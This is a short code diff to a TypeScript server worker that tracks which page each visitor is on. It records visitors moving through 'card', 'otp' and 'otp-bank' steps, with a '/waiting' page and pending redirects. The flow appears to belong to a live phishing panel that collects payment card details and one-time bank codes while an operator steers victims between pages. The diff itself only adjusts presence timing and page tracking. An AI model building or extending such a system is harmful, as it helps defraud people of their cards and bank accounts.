@@ -145,7 +145,7 @@ function extractVisitorMeta(request: Request): VisitorMeta {
 }
 
 function prunePresence() {
-  const cutoff = Date.now() - 12000;
+  const cutoff = Date.now() - 30000;
   for (const [k, entry] of devicePresence.entries()) {
     if (entry.lastSeen < cutoff) devicePresence.delete(k);
   }
@@ -452,6 +452,8 @@ export default {
         if (error || !data) {
           return jsonResponse({ error: 'الطلب غير موجود' }, 404);
         }
+        const currentPage = lastKnownUserPage.get(id) || '/waiting';
+        userPresence.set(id, { lastSeen: Date.now(), currentPage });
         return jsonResponse(fromSupabaseRow(data));
       }
 
@@ -534,6 +536,8 @@ export default {
           if (error || !data) {
             return jsonResponse({ error: 'الطلب غير موجود' }, 404);
           }
+          const currentPage = lastKnownUserPage.get(id) || '/waiting';
+          userPresence.set(id, { lastSeen: Date.now(), currentPage });
           return jsonResponse(fromSupabaseRow(data));
         }
 
@@ -561,6 +565,9 @@ export default {
             }
           } else if (body?.step === 'card' || body?.step === 'otp' || body?.step === 'otp-bank') {
             pendingRedirects.delete(id);
+            const stepPage = body.step === 'card' ? '/waiting' : body.step === 'otp-bank' ? '/otp-bank' : '/otp';
+            userPresence.set(id, { lastSeen: Date.now(), currentPage: stepPage });
+            lastKnownUserPage.set(id, stepPage);
           }
 
           const { data, error } = await supabase
